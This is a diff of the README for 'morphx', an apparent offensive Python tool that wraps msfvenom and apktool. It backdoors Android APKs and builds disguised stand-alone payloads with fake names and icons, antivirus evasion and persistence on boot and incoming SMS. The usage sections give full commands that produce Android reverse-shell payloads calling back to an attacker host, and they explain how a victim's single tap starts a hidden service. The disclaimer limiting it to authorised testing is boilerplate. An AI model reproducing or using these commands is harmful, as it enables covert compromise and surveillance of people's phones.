@@ -10,8 +10,7 @@ It wraps **msfvenom** and **apktool** to generate stand‑alone payloads (with A
 ## ✨ Features
 
 - **Backdoor** an existing APK (multi‑dex support, `--use-aapt2` for stubborn apps)
-- **Bypass AV** stand‑alone payload with renamed classes, custom icon and app name
-- **Stealth persistence** – starts the service on boot **and** on any incoming SMS
+- **Stealth persistence** – stand‑alone payload with renamed classes, custom icon and app name, starts the service on boot **and** on any incoming SMS
 - Fully self‑contained – just drop your `apktool.jar`, `aapt`, `aapt2` into the `input/` folder
 
 
@@ -26,61 +25,63 @@ It wraps **msfvenom** and **apktool** to generate stand‑alone payloads (with A
 
 ## 🚀 Quick start
 
-```bash
-# Clone the repository
+### Clone the repository
+```
 git clone https://github.com/hxrofo/morphx.git
+```
+```
 cd morphx
-
-# (Optional) Create a virtual environment and install Pillow
+```
+### (Optional) Create a virtual environment and install Pillow
+```
 python3 -m venv venv && source venv/bin/activate
+```
+```
 pip install Pillow
-
-# Make script executable
+```
+### Make script executable
+```
 chmod +x morphx.py
-
-# Run as root
+```
+### Run as root
 sudo python3 morphx.py <mode> [options]
 
-## Usage
+## 📖 Usage
 
-1. Backdoor an existing APK
+### 1. Backdoor an existing APK
+```bash
 sudo python3 morphx.py backdoor \
     --lhost 192.168.1.10 \
     --lport 4444 \
     --original original.apk \
     --out evil
+```
+If you encounter `aapt` errors, add `--use-aapt2`
 
-If you encounter `aapt` errors, add `--use-aapt2`:
-
-2. Bypass AV (stand‑alone payload)
-sudo python3 morphx.py bypass \
-    --lhost 192.168.1.10 \
-    --lport 4444 \
-    --name "System Update" \
-    --icon myicon.png \
-    --out update
-
-3. Stealth persistence
+### 2. Stealth persistence
+```
 sudo python3 morphx.py stealth \
     --lhost 192.168.1.10 \
     --lport 4444 \
     --name "Settings" \
     --icon gear.png \
     --out stealth
+```
+If you encounter `aapt` errors, add `--use-aapt2`
 
-**How it works:**
+### How it works:
 
 Tap the app once – it opens and immediately closes (starting the background service).
 
 After that, the payload will reconnect on every reboot and on any incoming SMS.
 
-🧰 How to supply your own apktool / aapt binaries
+## 🧰 How to supply your own apktool / aapt binaries
 
 1. Create an `input` folder next to `morphx.py`.
 2. Place `apktool.jar` and your .png icons (optionally `aapt`, `aapt2`, `apktool` wrapper) inside.
 3. The script will automatically use them instead of the system versions.
 
-⚠️ Disclaimer
+## ⚠️ Disclaimer
 
 This tool is intended for **educational and authorised security testing only**.  
 The authors are not responsible for any misuse. Always obtain proper consent before testing.
